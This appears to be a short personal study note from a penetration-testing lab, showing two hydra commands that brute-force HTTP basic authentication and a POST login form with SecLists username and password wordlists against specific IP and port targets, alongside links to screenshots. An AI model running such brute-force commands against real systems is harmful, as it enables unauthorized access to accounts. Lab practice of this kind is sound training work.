___

# GET

![[Pasted image 20241004131226.png]]

![[Pasted image 20241004131402.png]]

![[Pasted image 20241004131415.png]]

```bash
hydra -l basic-auth-user -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 83.136.254.47 http-get / -s 52283
```

![[Pasted image 20241004131840.png]]

![[Pasted image 20241004132934.png]]

# POST

![[Pasted image 20241004134542.png]]

![[Pasted image 20241004134603.png]]

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt -f 94.237.49.214 -s 37645 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

![[Pasted image 20241004134809.png]]

